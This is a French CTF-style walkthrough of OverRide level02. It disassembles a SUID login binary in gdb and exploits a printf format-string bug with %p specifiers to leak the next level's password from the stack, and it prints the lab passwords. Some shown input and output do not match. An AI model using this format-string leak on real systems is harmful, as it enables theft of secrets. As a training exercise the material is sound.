## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le level01
  $ ssh level02@127.0.0.1 -p 4242
  level02@127.0.0.1's password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
  
  # On regarde ce qu'on a
  level02@OverRide:~$ ls -la
    total 21
    dr-xr-x---+ 1 level02 level02   80 Sep 13  2016 .
    dr-x--x--x  1 root    root     260 Oct  2  2016 ..
    -rw-r--r--  1 level02 level02  220 Sep 10  2016 .bash_logout
    lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
    -rw-r--r--  1 level02 level02 3533 Sep 10  2016 .bashrc
    -rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
    -rw-r--r--+ 1 level02 level02   41 Oct 19  2016 .pass
    -rw-r--r--  1 level02 level02  675 Sep 10  2016 .profile

  # On teste les arguments
  level02@OverRide:~$ ./level02
    ===== [ Secure Access System v1.0 ] =====
    /***************************************\
    | You must login to access this system. |
    \**************************************/
    --[ Username: dat_wil
    --[ Password: admin
    *****************************************
    dat_wil does not have access!
  ```
  * On a un binaire appartenant a level03 dans le home avec les droits SUID...
  * ... qui demande un username et un password ...
  * ... qui ne segfault pas avec des input trop longs

### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    level02@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    level02@RainFall:/tmp$ gdb ~/level02
      [...]
      Reading symbols from /home/user/level02/level02...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info function
      All defined functions:

      Non-debugging symbols:
      # !! Les addresses sont différentes de d'habitude sinon rien de nouveau
      0x0000000000400640  _init
      0x0000000000400670  strncmp
      0x0000000000400670  strncmp@plt
      0x0000000000400680  puts
      0x0000000000400680  puts@plt
      0x0000000000400690  fread
      0x0000000000400690  fread@plt
      0x00000000004006a0  fclose
      0x00000000004006a0  fclose@plt
      0x00000000004006b0  system
      0x00000000004006b0  system@plt
      0x00000000004006c0  printf
      0x00000000004006c0  printf@plt
      0x00000000004006d0  strcspn
      0x00000000004006d0  strcspn@plt
      0x00000000004006e0  __libc_start_main
      0x00000000004006e0  __libc_start_main@plt
      0x00000000004006f0  fgets
      0x00000000004006f0  fgets@plt
      0x0000000000400700  fopen
      0x0000000000400700  fopen@plt
      0x0000000000400710  exit
      0x0000000000400710  exit@plt
      0x0000000000400720  fwrite
      0x0000000000400720  fwrite@plt
      0x0000000000400730  _start
      0x000000000040075c  call_gmon_start
      0x0000000000400780  __do_global_dtors_aux
      0x00000000004007f0  frame_dummy
      0x0000000000400814  main
      0x0000000000400ac0  __libc_csu_init
      0x0000000000400b50  __libc_csu_fini
      0x0000000000400b60  __do_global_ctors_aux
      0x0000000000400b98  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x400bb0
      0x400bb0:	 "r"
    gdb-peda$ x/s 0x400bb2
      0x400bb2:	 "/home/users/level03/.pass"
    gdb-peda$ x/s 0x400bd0
      0x400bd0:	 "ERROR: failed to open password file\n"
    gdb-peda$ x/s 0x400bf5
      0x400bf5:	 "\n"
    gdb-peda$ x/s 0x400bf8
      0x400bf8:	 "ERROR: failed to read password file\n"
    gdb-peda$ x/s 0x400c20
      0x400c20:	 "===== [ Secure Access System v1.0 ] ====="
    gdb-peda$ x/s 0x400c50
      0x400c50:	 "/", '*' <repeats 39 times>, "\\"
    gdb-peda$ x/s 0x400c80
      0x400c80:	 "| You must login to access this system. |"
    gdb-peda$ x/s 0x400cb0
      0x400cb0:	 "\\", '*' <repeats 38 times>, "/"
    gdb-peda$ x/s 0x400cd9
      0x400cd9:	 "--[ Username: "
    gdb-peda$ x/s 0x400ce8
      0x400ce8:	 "--[ Password: "
    gdb-peda$ x/s 0x400d3a
      0x400d3a:	 " does not have access!"
    gdb-peda$ x/s 0x400d22
      0x400d22:	 "Greetings, %s!\n"
    gdb-peda$ x/s 0x400d32
      0x400d32:	 "/bin/sh"
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # Ici on ne travaille pas avec les registres 32 bits mais avec les registres 64 bits
      # En les lisant pour ne pas vous perdre, lisez un e a la place du r

      # Initialisation, allocation de 288 octets
      0x0000000000400814 <+0>:	push   rbp
      0x0000000000400815 <+1>:	mov    rbp,rsp
      0x0000000000400818 <+4>:	sub    rsp,0x120

      # Push rdi et rsi
      0x000000000040081f <+11>:	mov    DWORD PTR [rbp-0x114],edi
      0x0000000000400825 <+17>:	mov    QWORD PTR [rbp-0x120],rsi

      # memset(buffer1[100], '\0', 48)
      0x000000000040082c <+24>:	lea    rdx,[rbp-0x70]
      0x0000000000400830 <+28>:	mov    eax,0x0
      0x0000000000400835 <+33>:	mov    ecx,0xc
      0x000000000040083a <+38>:	mov    rdi,rdx
      0x000000000040083d <+41>:	rep stos QWORD PTR es:[rdi],rax
      0x0000000000400840 <+44>:	mov    rdx,rdi
      0x0000000000400843 <+47>:	mov    DWORD PTR [rdx],eax
      0x0000000000400845 <+49>:	add    rdx,0x4

      # memset(buffer2[48], '\0', 20)
      0x0000000000400849 <+53>:	lea    rdx,[rbp-0xa0]
      0x0000000000400850 <+60>:	mov    eax,0x0
      0x0000000000400855 <+65>:	mov    ecx,0x5
      0x000000000040085a <+70>:	mov    rdi,rdx
      0x000000000040085d <+73>:	rep stos QWORD PTR es:[rdi],rax
      0x0000000000400860 <+76>:	mov    rdx,rdi
      0x0000000000400863 <+79>:	mov    BYTE PTR [rdx],al
      0x0000000000400865 <+81>:	add    rdx,0x1

      # memset(buffer3[112], '\0', 48)
      0x0000000000400869 <+85>:	lea    rdx,[rbp-0x110]
      0x0000000000400870 <+92>:	mov    eax,0x0
      0x0000000000400875 <+97>:	mov    ecx,0xc
      0x000000000040087a <+102>:	mov    rdi,rdx
      0x000000000040087d <+105>:	rep stos QWORD PTR es:[rdi],rax
      0x0000000000400880 <+108>:	mov    rdx,rdi
      0x0000000000400883 <+111>:	mov    DWORD PTR [rdx],eax
      0x0000000000400885 <+113>:	add    rdx,0x4

      # rbp - 8 = rbp - 4 = 0
      0x0000000000400889 <+117>:	mov    QWORD PTR [rbp-0x8],0x0
      0x0000000000400891 <+125>:	mov    DWORD PTR [rbp-0xc],0x0

      # rbp - 8 = fd = fopen("/home/users/level03/.pass", "r")
      0x0000000000400898 <+132>:	mov    edx,0x400bb0
      0x000000000040089d <+137>:	mov    eax,0x400bb2
      0x00000000004008a2 <+142>:	mov    rsi,rdx
      0x00000000004008a5 <+145>:	mov    rdi,rax
      0x00000000004008a8 <+148>:	call   0x400700 <fopen@plt>
      0x00000000004008ad <+153>:	mov    QWORD PTR [rbp-0x8],rax

      # if !fd then fwrite("ERROR: failed to open password file\n", 1, 36, stderr)
      # and exit(1)
      0x00000000004008b1 <+157>:	cmp    QWORD PTR [rbp-0x8],0x0
      0x00000000004008b6 <+162>:	jne    0x4008e6 <main+210>
      0x00000000004008b8 <+164>:	mov    rax,QWORD PTR [rip+0x200991] # 0x601250 <stderr@@GLIBC_2.2.5>
      0x00000000004008bf <+171>:	mov    rdx,rax
      0x00000000004008c2 <+174>:	mov    eax,0x400bd0
      0x00000000004008c7 <+179>:	mov    rcx,rdx
      0x00000000004008ca <+182>:	mov    edx,0x24
      0x00000000004008cf <+187>:	mov    esi,0x1
      0x00000000004008d4 <+192>:	mov    rdi,rax
      0x00000000004008d7 <+195>:	call   0x400720 <fwrite@plt>
      0x00000000004008dc <+200>:	mov    edi,0x1
      0x00000000004008e1 <+205>:	call   0x400710 <exit@plt>

      # rbp - 12 = fread(buffer2, 1, 41, fd) => Notre password est copié dans la stack!
      0x00000000004008e6 <+210>:	lea    rax,[rbp-0xa0]
      0x00000000004008ed <+217>:	mov    rdx,QWORD PTR [rbp-0x8]
      0x00000000004008f1 <+221>:	mov    rcx,rdx
      0x00000000004008f4 <+224>:	mov    edx,0x29
      0x00000000004008f9 <+229>:	mov    esi,0x1
      0x00000000004008fe <+234>:	mov    rdi,rax
      0x0000000000400901 <+237>:	call   0x400690 <fread@plt>
      0x0000000000400906 <+242>:	mov    DWORD PTR [rbp-0xc],eax

      # buffer2[strcspn(buffer2, "\n")] = "\0"
      # On met un "\0" a la place du premier "\n" dans buffer2
      0x0000000000400909 <+245>:	lea    rax,[rbp-0xa0]
      0x0000000000400910 <+252>:	mov    esi,0x400bf5
      0x0000000000400915 <+257>:	mov    rdi,rax
      0x0000000000400918 <+260>:	call   0x4006d0 <strcspn@plt>
      0x000000000040091d <+265>:	mov    BYTE PTR [rbp+rax*1-0xa0],0x0

      # Si nb_char_read != 41:...
      0x0000000000400925 <+273>:	cmp    DWORD PTR [rbp-0xc],0x29
      0x0000000000400929 <+277>:	je     0x40097d <main+361>

      # ... fwrite("ERROR: failed to read password file\n", 1, 36, stderr)...
      0x000000000040092b <+279>:	mov    rax,QWORD PTR [rip+0x20091e]        # 0x601250 <stderr@@GLIBC_2.2.5>
      0x0000000000400932 <+286>:	mov    rdx,rax
      0x0000000000400935 <+289>:	mov    eax,0x400bf8
      0x000000000040093a <+294>:	mov    rcx,rdx
      0x000000000040093d <+297>:	mov    edx,0x24
      0x0000000000400942 <+302>:	mov    esi,0x1
      0x0000000000400947 <+307>:	mov    rdi,rax
      0x000000000040094a <+310>:	call   0x400720 <fwrite@plt>

      # ... fwrite("ERROR: failed to read password file\n", 1, 36, stderr)... 
      0x000000000040094f <+315>:	mov    rax,QWORD PTR [rip+0x2008fa]        # 0x601250 <stderr@@GLIBC_2.2.5>
      0x0000000000400956 <+322>:	mov    rdx,rax
      0x0000000000400959 <+325>:	mov    eax,0x400bf8
      0x000000000040095e <+330>:	mov    rcx,rdx
      0x0000000000400961 <+333>:	mov    edx,0x24
      0x0000000000400966 <+338>:	mov    esi,0x1
      0x000000000040096b <+343>:	mov    rdi,rax
      0x000000000040096e <+346>:	call   0x400720 <fwrite@plt>

      # ... Exit(1)
      0x0000000000400973 <+351>:	mov    edi,0x1
      0x0000000000400978 <+356>:	call   0x400710 <exit@plt>

      # fclose(fd)
      0x000000000040097d <+361>:	mov    rax,QWORD PTR [rbp-0x8]
      0x0000000000400981 <+365>:	mov    rdi,rax
      0x0000000000400984 <+368>:	call   0x4006a0 <fclose@plt>

      # puts * 4:
      # ===== [ Secure Access System v1.0 ] =====
      # /***************************************\
      # | You must login to access this system. |
      # \***************************************/
      0x0000000000400989 <+373>:	mov    edi,0x400c20
      0x000000000040098e <+378>:	call   0x400680 <puts@plt>
      0x0000000000400993 <+383>:	mov    edi,0x400c50
      0x0000000000400998 <+388>:	call   0x400680 <puts@plt>
      0x000000000040099d <+393>:	mov    edi,0x400c80
      0x00000000004009a2 <+398>:	call   0x400680 <puts@plt>
      0x00000000004009a7 <+403>:	mov    edi,0x400cb0
      0x00000000004009ac <+408>:	call   0x400680 <puts@plt>

      # printf("--[ Username: ")
      0x00000000004009b1 <+413>:	mov    eax,0x400cd9
      0x00000000004009b6 <+418>:	mov    rdi,rax
      0x00000000004009b9 <+421>:	mov    eax,0x0
      0x00000000004009be <+426>:	call   0x4006c0 <printf@plt>

      # fgets(buffer1, 100, stdin)
      0x00000000004009c3 <+431>:	mov    rax,QWORD PTR [rip+0x20087e]        # 0x601248 <stdin@@GLIBC_2.2.5>
      0x00000000004009ca <+438>:	mov    rdx,rax
      0x00000000004009cd <+441>:	lea    rax,[rbp-0x70]
      0x00000000004009d1 <+445>:	mov    esi,0x64
      0x00000000004009d6 <+450>:	mov    rdi,rax
      0x00000000004009d9 <+453>:	call   0x4006f0 <fgets@plt>

      # buffer1[strcspn(buffer1, "\n")] = "\0"
      0x00000000004009de <+458>:	lea    rax,[rbp-0x70]
      0x00000000004009e2 <+462>:	mov    esi,0x400bf5
      0x00000000004009e7 <+467>:	mov    rdi,rax
      0x00000000004009ea <+470>:	call   0x4006d0 <strcspn@plt>
      0x00000000004009ef <+475>:	mov    BYTE PTR [rbp+rax*1-0x70],0x0

      # printf("--[ Password: ")
      0x00000000004009f4 <+480>:	mov    eax,0x400ce8
      0x00000000004009f9 <+485>:	mov    rdi,rax
      0x00000000004009fc <+488>:	mov    eax,0x0
      0x0000000000400a01 <+493>:	call   0x4006c0 <printf@plt>

      # fgets(buffer3, 100, stdin)
      0x0000000000400a06 <+498>:	mov    rax,QWORD PTR [rip+0x20083b]        # 0x601248 <stdin@@GLIBC_2.2.5>
      0x0000000000400a0d <+505>:	mov    rdx,rax
      0x0000000000400a10 <+508>:	lea    rax,[rbp-0x110]
      0x0000000000400a17 <+515>:	mov    esi,0x64
      0x0000000000400a1c <+520>:	mov    rdi,rax
      0x0000000000400a1f <+523>:	call   0x4006f0 <fgets@plt>

      # buffer3[strcspn(buffer3, "\n")] = "\0"
      0x0000000000400a24 <+528>:	lea    rax,[rbp-0x110]
      0x0000000000400a2b <+535>:	mov    esi,0x400bf5
      0x0000000000400a30 <+540>:	mov    rdi,rax
      0x0000000000400a33 <+543>:	call   0x4006d0 <strcspn@plt>
      0x0000000000400a38 <+548>:	mov    BYTE PTR [rbp+rax*1-0x110],0x0

      # puts("*****************************************")
      0x0000000000400a40 <+556>:	mov    edi,0x400cf8
      0x0000000000400a45 <+561>:	call   0x400680 <puts@plt>

      # if !strncmp(buffer2, buffer3) jump main+642 => print error message et exit(1) 
      0x0000000000400a4a <+566>:	lea    rcx,[rbp-0x110]
      0x0000000000400a51 <+573>:	lea    rax,[rbp-0xa0]
      0x0000000000400a58 <+580>:	mov    edx,0x29
      0x0000000000400a5d <+585>:	mov    rsi,rcx
      0x0000000000400a60 <+588>:	mov    rdi,rax
      0x0000000000400a63 <+591>:	call   0x400670 <strncmp@plt>
      0x0000000000400a68 <+596>:	test   eax,eax
      0x0000000000400a6a <+598>:	jne    0x400a96 <main+642>

      # sinon printf("Greetings, %s!\n", buffer1)...
      0x0000000000400a6c <+600>:	mov    eax,0x400d22
      0x0000000000400a71 <+605>:	lea    rdx,[rbp-0x70]
      0x0000000000400a75 <+609>:	mov    rsi,rdx
      0x0000000000400a78 <+612>:	mov    rdi,rax
      0x0000000000400a7b <+615>:	mov    eax,0x0
      0x0000000000400a80 <+620>:	call   0x4006c0 <printf@plt>

      # ... system("/bin/sh")
      0x0000000000400a85 <+625>:	mov    edi,0x400d32
      0x0000000000400a8a <+630>:	call   0x4006b0 <system@plt>
      
      # ... return(0)
      0x0000000000400a8f <+635>:	mov    eax,0x0
      0x0000000000400a94 <+640>:	leave
      0x0000000000400a95 <+641>:	ret

      # printf(buffer1)
      0x0000000000400a96 <+642>:	lea    rax,[rbp-0x70]
      0x0000000000400a9a <+646>:	mov    rdi,rax
      0x0000000000400a9d <+649>:	mov    eax,0x0
      0x0000000000400aa2 <+654>:	call   0x4006c0 <printf@plt>

      # puts(" does not have access!")
      0x0000000000400aa7 <+659>:	mov    edi,0x400d3a
      0x0000000000400aac <+664>:	call   0x400680 <puts@plt>

      # exit(1)
      0x0000000000400ab1 <+669>:	mov    edi,0x1
      0x0000000000400ab6 <+674>:	call   0x400710 <exit@plt>
      End of assembler dump.
  ```

## 2: Comportement
> Une fois recomposé, on comprend que le programme demande des identifiants et lance un shell si le password est le meme que notre flag.\
> S'il n'est pas pareil, on printf l'username (vulnérabilité aux format string).\
> On a aussi un check si on n'arrive pas a lire le fichier de password, le programme s'arrête.\
> Or, lorsqu'on lance avec gdb, le open ne fonctionne pas. On ne peut donc pas chercher de patterns.


## 3: Exploit

### A: Explication

> Comme on peut s'en douter, on va utiliser la faille des format string.\
> L'objectif ici est d'afficher le password qui est stocké dans la stack en dumpant la mémoire.\
> Or, on travaille ici avec les registres x64.\
> Il existe une convention qui dit que les fonctions doivent aller chercher leurs parametres dans ces registres, puis sur la stack par la suite (il y a 6 registres-paramètres)\
> On peut essayer a tatons mais si on lit dans certains registres, on se prend un segfault.\
> On peut aussi chercher à tatons a partir de 7 arguments, et c'est la méthode que l'on va choisir.\
> On verra plus tard que l'on peut aussi calculer combien il nous faut d'arguments.\

### B: Creation de l'exploit

* Cherchons donc à tatons a1 partir de 7 arguments (je ne vais pas montrer ici les échecs de print des registres, ce ne sont que des segfault)

```shell
  level02@OverRide:/tmp$ ~/level02
    ===== [ Secure Access System v1.0 ] =====
    /***************************************\
    | You must login to access this system. |
    \**************************************/
    --[ Username: %7$p %8$p %9$p %10$p %11$p %12$p %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p %21$p %22$p %23$p
    --[ Password: AAAAAAAA
    *****************************************
    0x1f7ff9a08 0x4141414141414141 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 does not have access
```

* On voit qu'il y a quelque chose au tout debut de la stack.
* On ne reconnaît pas facilement ce qu'est le premier mais le 2ème si! C'est notre password.
* Grâce à l'analyse on sait qu'apres notre password on a le flag dans la stack.
* Il y a quelque chose vers le 22 et 23ème caractère donc regardons à partir de là.

```shell
  level02@OverRide:/tmp$ ~/level02
    ===== [ Secure Access System v1.0 ] =====
    /***************************************\
    | You must login to access this system. |
    \**************************************/
    --[ Username: %176$s
    --[ Password: onsenfoutdupassword
    *****************************************
    0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x2520702432322520 0x3432252070243332 does not have access!
```

* Bon on a quelquechose qui à l'air pas mal.
* En effet pour afficher 40 caractères il nous faut 40 / 8 = 5 addresses.
* Et on a une suite de 5 addresses avec un \0 à la fin.
* Il va maintenant falloir revert ces 5 addresses pour avoir notre flag!

```shell
  # On transforme l'hexa en ascii
  756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
         |                 |               |                 |               |
         v                 v               v                 v               v
      unPR47hH          EAJ5as9Q         7zqCWNgX        5J5hnGXs         H3gPfK9M
  # On revert chaque string (oui le little endian inverse tout)
         |                 |               |                 |               |
         v                 v               v                 v               v
      Hh74RPnu          Q9sa5JAE         XgNWCqz7        sXGnh5J5         M9KfPg3H
  # Ce qui nous donne:
  Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
  level02@OverRide:/tmp$ su level03
    Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
  level03@OverRide:~$
```